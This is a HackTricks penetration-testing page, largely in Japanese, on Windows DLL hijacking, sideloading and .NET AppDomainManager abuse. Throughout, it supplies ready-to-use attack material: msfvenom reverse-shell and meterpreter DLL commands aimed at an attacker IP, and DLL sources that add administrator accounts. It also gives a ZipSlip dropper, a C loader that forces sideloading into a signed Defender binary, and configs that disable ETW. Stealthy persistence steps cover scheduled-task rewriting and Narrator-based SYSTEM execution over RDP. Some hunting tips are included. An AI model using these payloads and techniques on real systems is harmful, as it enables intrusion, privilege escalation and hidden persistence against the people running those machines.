# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking とは、信頼されたアプリケーションを操作して悪意のある DLL を読み込ませる手法です。この用語には、**DLL Spoofing, Injection, Side-Loading** などの複数の戦術が含まれます。主に code execution、persistency の確立、そしてあまり一般的ではないものの privilege escalation に使われます。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的にかかわらず一貫しています。

### Common Techniques

DLL hijacking にはいくつかの方法があり、各手法の有効性はアプリケーションの DLL 読み込み戦略によって異なります。

1. **DLL Replacement**: 正規の DLL を悪意のあるものに置き換えます。必要に応じて DLL Proxying を使い、元の DLL の機能を維持できます。
2. **DLL Search Order Hijacking**: 悪意のある DLL を正規のものより前に検索されるパスへ配置し、アプリケーションの検索順序を悪用します。
3. **Phantom DLL Hijacking**: 存在しないはずの必要 DLL として、アプリケーションに悪意のある DLL を読み込ませます。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意のある DLL へ誘導します。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意のあるものに置き換える手法で、DLL side-loading と関連付けられることが多いです。
6. **Relative Path DLL Hijacking**: ユーザーが制御できるディレクトリに、コピーしたアプリケーションと一緒に悪意のある DLL を配置する手法で、Binary Proxy Execution techniques に似ています。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading は、信頼された **.NET Framework** プロセスに attacker code を読み込ませる唯一の方法ではありません。対象の実行ファイルが **managed** application の場合、CLR は実行ファイル名に対応する **application configuration file** も参照します（例: `Setup.exe.config`）。そのファイルでカスタム **AppDomainManager** を定義できます。config が EXE の横に置かれた attacker-controlled assembly を指している場合、CLR はそれを **application's normal code path** より前に読み込み、信頼されたプロセス内で実行します。

Microsoft の .NET Framework configuration schema によると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践的な注意:
- これは **.NET Framework specific** の tradecraft です。Win32 DLL search order ではなく、CLR config parsing に依存します。
- ホストは本当に **managed EXE** である必要があります。簡易確認: `sigcheck -m target.exe`, `corflags target.exe`, または PE metadata 内の **CLR Runtime Header** を確認します。
- config ファイル名は実行ファイル名と完全一致する必要があります (`<binary>.config`)。通常は **EXE の隣** に置かれます。
- これは **signed Microsoft/vendor binaries** と組み合わせると有用です。信頼された EXE 自体は変更せず、malicious managed assembly が in-process で実行されます。
- すでに書き込み可能な installer/update ディレクトリがあるなら、AppDomainManager hijacking を **first stage** として使い、その後の stage で classic DLL sideloading か reflective loading を使えます。

### 既存の scheduled task を hijacking して sideload chain を再起動する

persistence のために、**新しい task を作成する** ことだけを探さないでください。intrusion set の中には、正規の installer が **normal updater task** を作成するまで待ち、その後に **task action を rewrite** して、既存の name、author、trigger を defender にとって見慣れたままにするものがあります。

再利用可能な workflow:
1. 正規ソフトウェアを install/run して、通常作成される task を特定します。
2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を確認します。
3. action だけを置き換えて、task が user-writable な staging directory から **trusted host EXE** を起動するようにし、その後に real payload を side-load するか AppDomain-load します。
4. 目立つ新しい persistence artifact を作らず、同じ task name を再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
なぜより stealthy か:
- タスク名は依然として正当そうに見えることがある（たとえば vendor updater）。
- **Task Scheduler service** がそれを起動するため、parent/ancestor validation では `explorer.exe` ではなく、期待される scheduling chain が見えることが多い。
- **新しい task names** だけを探す DFIR チームは、登録自体は既に存在していたが action が `%LOCALAPPDATA%`、`%APPDATA%`、または他の attacker-controlled path を指すようになった task を見逃すことがある。

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` の metadata を baseline と比較する。
- **vendor-looking updater task** が **user-writable directories** から実行されたり、同じ場所にある `*.config` file を伴う .NET EXE を起動したら alert する。

> [!TIP]
> DLL sideloading の上に HTML staging、AES-CTR configs、.NET implants を重ねる step-by-step chain については、以下の workflow を確認してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls を見つける

system 内で missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つの filters を設定する**ことです:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

そして **File System Activity** だけを表示します:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

**missing dlls 全般** を探している場合は、これを **数秒** そのまま動かします。\
特定の executable 内の **missing dll** を探している場合は、**別の filter で "Process Name" "contains" `<exec name>` を設定し、実行して、event capture を停止** します。

## Missing Dlls の Exploiting

privilege escalation を行うには、最善の機会は、**privilege process が load しようとする dll を書き込める**ことです。その dll が **search される場所** のどこかに置ける必要があります。つまり、**元の dll** がある folder よりも先に **search される folder** に dll を **書き込める**（珍しいケース）か、あるいは dll が **search される folder** に **書き込めて**、しかもどの folder にも original **dll が存在しない**、という状況を作れます。

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) の中で、Dll が具体的にどう load されるかを確認できます。

**Windows applications** は、あらかじめ定義された **search paths** に従って DLL を探し、特定の順序で参照します。DLL hijacking の問題は、悪意ある DLL をこれらの directory のいずれかに戦略的に配置し、正規の DLL より先に load されるようにすることで発生します。これを防ぐには、application が必要な DLL を参照する際に absolute paths を使うようにすることです。

32-bit system の **DLL search order** は以下のとおりです。

1. application が load された directory
2. system directory. この directory の path を取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使います。(_C:\Windows\System32_)
3. 16-bit system directory. この directory の path を取得する function はありませんが、search されます。(_C:\Windows\System_)
4. Windows directory. この directory の path を取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使います。
1. (_C:\Windows_)
5. current directory
6. PATH environment variable に list されている directories。これは **App Paths** registry key で指定される per-application path を含まないことに注意してください。**App Paths** key は DLL search path の計算には使われません。

これは **SafeDllSearchMode** が有効なときの **default** search order です。無効にすると current directory は 2 番目に昇格します。これを無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** 付きで呼ばれると、search は **LoadLibraryEx** が load している executable module の directory から始まります。

最後に、**dll は名前だけでなく absolute path を指定して load されることもある**点に注意してください。その場合、その dll は **その path の中だけで search** されます（dll に依存関係がある場合、それらは名前だけで load されたのと同様に search されます）。

search order を変える他の方法もありますが、ここでは説明しません。

### 任意の file write を missing-DLL hijack に chain する

1. **ProcMon** filters（`Process Name` = target EXE、`Path` が `.dll` で終わる、`Result` = `NAME NOT FOUND`）を使って、process が probe するが見つけられない DLL 名を収集する。
2. binary が **schedule/service** で動く場合、その DLL 名のひとつを **application directory**（search-order の #1）に drop すると、次回 execution で load される。ある .NET scanner case では、process は `C:\Program Files\dotnet\fxr\...` から real copy を load する前に `C:\samples\app\` 内の `hostfxr.dll` を探していた。
3. 任意の export を持つ payload DLL（たとえば reverse shell）を build する: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive が **ZipSlip-style arbitrary write** なら、extract 先ディレクトリから escape して DLL が app folder に置かれるように ZIP を craft する:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. アーカイブを監視対象の inbox/share に届ける; scheduled task がプロセスを再起動すると、malicious DLL が読み込まれ、service account としてあなたの code が実行される。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新しく作成されるプロセスの DLL search path を決定的に制御する高度な方法は、ntdll の native APIs を使ってプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに attacker-controlled な directory を指定すると、名前で imported DLL を解決する target process（absolute path を使わず、safe loading flags も使わない）は、その directory から malicious DLL を読み込むよう強制できます。

Key idea
- RtlCreateProcessParametersEx で process parameters を構築し、制御下の folder を指す custom DllPath を指定する（たとえば dropper/unpacker が置かれている directory）。
- RtlCreateUserProcess で process を作成する。target binary が DLL を名前で解決すると、loader は解決時にこの指定された DllPath を参照し、malicious DLL が target EXE と同じ場所にない場合でも reliable な sideloading を可能にする。

Notes/limitations
- これは作成される child process に影響する; current process のみに作用する SetDllDirectory とは異なる。
- target は DLL を名前で import または LoadLibrary する必要がある（absolute path を使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使わない）。
- KnownDLLs や hardcoded absolute paths は hijack できない。forwarded exports と SxS により precedence が変わる場合がある。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- DllPath ディレクトリに、悪意のある xmllite.dll（必要な関数を export するか、real one に proxying する）を配置する。
- 上記の technique を使って、xmllite.dll を名前で look up することが知られている signed binary を起動する。loader は supplied DllPath を介して import を resolve し、あなたの DLL を sideloads する。

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** targets では、sideloading はアプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリを patching せずに **`Main()`** の前に実行できる。Win32 DLL search order のみに依存する代わりに、攻撃者は正規の .NET EXE の隣に悪意のある config と、1つ以上の attacker-controlled assemblies を配置する。

チェーンの動作は次のとおり:
1. host EXE が起動し、**CLR が `<exe>.config`** を読み込む。
2. config は **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、runtime が attacker-controlled な `AppDomainManager` を instantiate する。
3. 悪意のある manager は trusted host process 内で **pre-`Main()` execution** を得る。
4. 同じ config により、CLR に local assemblies を先に resolve させることができ（たとえば `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`）、inline patching なしで runtime validation/telemetry を弱められる。

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** は assembly resolution をアプリケーションディレクトリ内に固定し、そのフォルダを予測可能な sideloading surface にします。
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR 初期化中、正規の app ロジックが実行される前に、実行を attacker code に移します。
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust app が strong-name validation failure なしで unsigned または tampered assemblies を読み込める場合があります。
- **`<publisherPolicy apply="no"/>`** は、新しい assemblies への publisher-policy redirects を回避します。
- **`<requiredRuntime ... safemode="true"/>`** は runtime selection をより deterministic にします。
- **`<etwEnable enabled="false"/>`** は特に興味深く、**CLR が自分自身の ETW visibility を configuration から無効化**しており、implant がメモリ上で `EtwEventWrite` を patch する必要がありません。

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行ファイルの imports と dll の exports は、次のように確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内の任意のfolderに書き込み権限があるかを確認します。\
他にこの脆弱性を見つけるのに役立つ自動化ツールとしては、**PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ と _Write-HijackDll_ があります。

### Example

悪用可能なシナリオを見つけた場合、成功させるために最も重要なことの1つは、**実行ファイルがそこからimportする関数を少なくともすべてexportするdllを作成すること**です。とはいえ、Dll Hijackingは [**Medium Integrity levelからHighへ昇格する（UAC bypass）**](../../authentication-credentials-uac-and-efs/index.html#uac) ときや、[ **High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)**.** 昇格するときに便利です。**有効なdllを作成する方法**の例は、execution向けのdll hijackingに焦点を当てたこの調査記事の中にあります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクション**では、**テンプレート**として役立つ、または**必要ない関数をexportしたdllを作成する**のに使える、いくつかの**基本的なdllコード**を見つけられます。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に、**Dll proxy** とは、**読み込まれたときに悪意あるコードを実行できる**一方で、**実際のlibraryへのすべてのcallをrelayすることで**、**期待どおりに** **expose** され、**動作**できる Dll のことです。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、**executableを指定してproxifyしたい libraryを選び、proxified dllを生成する**か、**Dllを指定してproxified dllを生成する**ことができます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86 版のみで、x64 版は見当たりませんでした):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自作のもの

いくつかのケースでは、コンパイルした Dll は、被害者プロセスによって読み込まれる**複数の関数を export**する必要があります。これらの関数が存在しない場合、**binary は読み込めず**、**exploit は失敗**します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を伴う C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ別のC DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き探索し、任意コード実行と persistence に悪用される可能性があります。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 素朴な hijack は UI を喋らせたりハイライトしたりする。静かにするには、attach 時に Narrator のスレッドを列挙し、main thread を `OpenThread(THREAD_SUSPEND_RESUME)` で開いて `SuspendThread` する; その後は自分の thread で続行する。完全なコードは PoC を参照。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator を起動すると植え込んだ DLL が読み込まれる。secure desktop (logon screen) では CTRL+WIN+ENTER を押して Narrator を起動し、DLL は secure desktop 上で SYSTEM として実行される。

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer を許可する: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストへ RDP 接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動する; DLL は secure desktop 上で SYSTEM として実行される。
- RDP セッションが閉じると実行は停止する—速やかに inject/migrate する。

Bring Your Own Accessibility (BYOA)
- built-in Accessibility Tool (AT) の registry entry (例: CursorIndicator) を clone し、それを任意の binary/DLL を指すように編集して import し、その後 `configuration` をその AT 名に設定できる。これにより Accessibility framework 経由で任意の実行を proxy できる。

Notes
- `%windir%\System32` への書き込みと HKLM 値の変更には admin 権限が必要。
- すべての payload logic は `DLL_PROCESS_ATTACH` に置ける; exports は不要。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

この case は Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を示しており、**CVE-2025-1729** として追跡されている。

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` に存在する。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、logon している user の context で毎日 9:30 AM に実行される。
- **Directory Permissions**: `CREATOR OWNER` によって書き込み可能で、local users が任意の file を置ける。
- **DLL Search Behavior**: まず working directory から `hostfxr.dll` の load を試み、欠落している場合は "NAME NOT FOUND" を記録する。これは local directory search の優先順位を示している。

### Exploit Implementation

attacker は、欠落している DLL を悪用して同じ directory に悪意ある `hostfxr.dll` stub を置き、user の context で code execution を達成できる:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に置く。
2. スケジュールされたタスクが 9:30 AM に現在のユーザーのコンテキストで実行されるのを待つ。
3. タスク実行時に administrator がログインしていれば、悪意のある DLL は administrator のセッション内で medium integrity で実行される。
4. standard UAC bypass techniques を連鎖させて、medium integrity から SYSTEM 権限へ昇格する。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors は、MSI ベースの dropper と DLL side-loading を組み合わせて、信頼された署名済みプロセスの下で payload を実行することがよくある。

Chain overview
- User が MSI をダウンロードする。GUI インストール中に CustomAction が静かに実行され（例: LaunchApplication や VBScript action）、埋め込まれた resources から次の stage を再構築する。
- dropper は正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows DLL search order により working directory から先に wsc.dll が読み込まれ、署名済み parent の下で attacker code が実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 実行ファイルや VBScript を実行するエントリを探す。疑わしいパターンの例: バックグラウンドで埋め込みファイルを実行する LaunchApplication。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary tables を確認する。
- MSI CAB 内の embedded/split payloads:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- または lessmsi を使う: `lessmsi x package.msi C:\out`
- 複数の小さな fragments があり、VBScript CustomAction によって連結・復号されるものを探す。一般的な flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 次の2つのファイルを同じフォルダに配置する:
- wsc_proxy.exe: 正規の署名済みホスト (Avast)。このプロセスは、自身のディレクトリから名前で wsc.dll を読み込もうとする。
- wsc.dll: attacker DLL。特定の export が不要なら DllMain だけで十分。必要なら、proxy DLL を作成し、必要な export を正規ライブラリへ forward しつつ、DllMain で payload を実行する。
- 最小限の DLL payload をビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件がある場合は、proxying framework（例: DLLirant/Spartacus）を使って、payload も実行する forwarding DLL を生成する。

